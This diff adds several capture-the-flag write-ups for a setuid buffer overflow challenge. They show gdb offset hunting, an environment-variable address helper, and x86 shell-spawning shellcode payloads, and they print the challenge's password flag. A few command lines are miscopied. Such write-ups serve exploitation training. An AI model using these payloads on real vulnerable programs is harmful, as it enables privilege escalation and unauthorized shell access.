@@ -1,0 +1,169 @@
+We use the large
+username
+buffer to store our shellcode then we overwrite the
+_atexit
+variable after we padded our shellcode with the necessary amount of junk.
+
+We find the username address (where we want to jump when we call _atexit) by running our program in gdb and typing
+info address username
+.
+Right so username address is 0x804a040, we can now construct our buffer that will finally look like this: [shellcode|junk|username address]. We use an execve(“/bin//sh”, [“/bin//sh”], NULL) shellcode here that gives us a buffer of 25 bytes. Then we pad with 487 to reach username size and overwrite _atexit from there with the address we found.
+
+./ch7 `python -c 'print "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "A" * 487 + "\x40\xa0\x04\x08"'`
+
+
+===============================================================================
+
+This setuid binary takes a username as parameter and copies it byte-by-byte to an 512-byte variable, then it prints a message and exits.
+
+The program does not truncate its argument if it is bigger than what the variable username can hold, and will happilly write the whole string to the stack (Buffer Overflow).
+
+By giving binary7 an argument sufficiently long we can overwrite EIP(which contains the address of the next instruction) and thus control the execution flow.
+
+We now have two things to do:
+
+    find the length of the argument we give to binary7 so EIP gets overwritten
+    find an address to point EIP to
+
+For the first part, we can use gdb:
+
+    binary7@challenge02:~$ gdb -q ./binary7
+    (gdb) run $(perl -e 'print "A"x512, "B"')
+    Starting program: /challenge/binary/binary7/binary7 $(perl -e 'print "A"x512, "B"')
+    [+] Running program with username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<...snip...>AAAAAAAAAAAAAAAAAAB
+     
+    Program received signal SIGSEGV, Segmentation fault.
+    0x08000042 in ?? ()
+    (gdb)
+
+Download
+
+By adding only one byte the the maximum length of the parameter (sizeof(username) = 512), the binary segfaults, and gdb prints the value of EIP: 0x08000042. B is \x42, so everything looks like EIP is just after username in the stack(in higher addresses), let’s check it:
+
+    $ gdb -q ./binary7
+    (gdb) run $(perl -e 'print "A"x512, "BCDE"')
+    Starting program: /challenge/binary/binary7/binary7 $(perl -e 'print "A"x512, "B"')
+    [+] Running program with username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<...snip...>AAAAAAAAAAAAAAAAAABCDE
+     
+    Program received signal SIGSEGV, Segmentation fault.
+    0x45444342 in ?? ()
+    (gdb)
+
+Download
+
+Good! 0x45444342 is EDCB (our "BCDE" in little-endian architecture). Now, we have to make EIP to point to something usefull. A shellcode contained in an environnement variable is something usefull:
+
+    $ SHELLCODE=$'\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42'
+    $ export SHELLCODE
+
+Download
+
+we can use this short C code to print the address of the SHELLCODE variable for the ./binary7 executable:
+
+    $ cat /tmp/getenv.c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+     
+    int main(int argc, char *argv[]) {
+       char *ptr;
+     
+       if(argc < 3) {
+          fprintf(stderr, "Usage: %s <environment var> <target program name>\n", argv[0]);
+          exit(1);
+       }
+     
+       /* Get env var location. */
+       ptr = getenv(argv[1]);
+     
+       /* Adjust for program name. */
+       ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
+       printf("%s will be at %p\n", argv[1], ptr);
+       return 0;
+    }
+
+Download
+
+Now Compile it:
+$ cd /tmp && gcc -o getenv getenv.c
+
+Now let’s try it:
+
+    $ cd
+    $ /tmp/getenv SHELLCODE ./binary7
+    SHELLCODE will be at 0xbffffe3b
+
+Download
+
+Since we running on a little endian architecture, we have to write the string "\x3b\xfe\xff\xbf" to EIP so it points to the address 0xbffffe3b:
+
+    $ binary7@challenge02:~$ ./binary7 $(perl -e 'print "A"x512, "\x3b\xfe\xff\xbf"')
+    [+] Running program with username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<...snip...>AAAAAAAAAAAAAAAAAA;þÿ¿
+    sh-3.2$ id
+    uid=1006(binary7) gid=1006(binary7) euid=1035(binary7cracked) groups=100(users),1006(binary7)
+    sh-3.2$ cat .passwd
+    aod8r2f!q:;oe
+    sh-3.2$ exit
+
+
+
+===============================================================================
+
+Here is another exploit but it does not need to calculate any variable address.
+This exploit uses constant address (atexit() function) to allocate shellcode and executes it.
+
+Here is the exploit line:
+
+perl -e 'print "A"x512;print "\x44\xa2\x04\x08";print "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";'
+
+===============================================================================
+
+to overflow EIP we need 512 bytes. we need an address after 512 bytes to overwrite EIP and do jumping to it.
+so our first payload is :
+
+"A"*512 + Address
+
+now we can decrease some bytes of our payload and add our shellcode. so we have this payload now ( for example we have a shellcode with 44 bytes ):
+
+"A"*468 + shellcode (44 bytes) + Address
+
+in perl :
+
+perl 'print "A"x468 . "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80" . "BBBB"
+
+to find address we can use bellow command in gdb :
+
+x/200s $esp
+
+and we have this result :
+
+...
+0xbffffc2a:       'A' <repeats 200 times>...
+0xbffffcf2:        'A' <repeats 200 times>...
+0xbffffdba:      'A' <repeats 68 times>
+...
+
+so we can use this address to jump it "0xbffffcf2" ! among the "A" characters ..
+and in last step we need NOPs to run shellcode. so we can use "\x90"s instead of "A" characters. we write our payload in perl :
+
+perl 'print "\x90"x468 . "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80" . "\xf2\xfc\xff\xbf"'
+
+final payload :
+
+./ch7 `perl -e 'print "\x90"x468 . "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80" . "\xf2\xfc\xff\xbf"'`
+
+password:
+
+[+] Running program with username : 1À1Û1É°Í1ÀPhn/shh//biã
+$°
+  Í1À°Íòüÿ¿
+sh-4.2$ cat .passwd
+aod8r2f!q:;oe
+
+===============================================================================
+
+
+
+===============================================================================
+
+
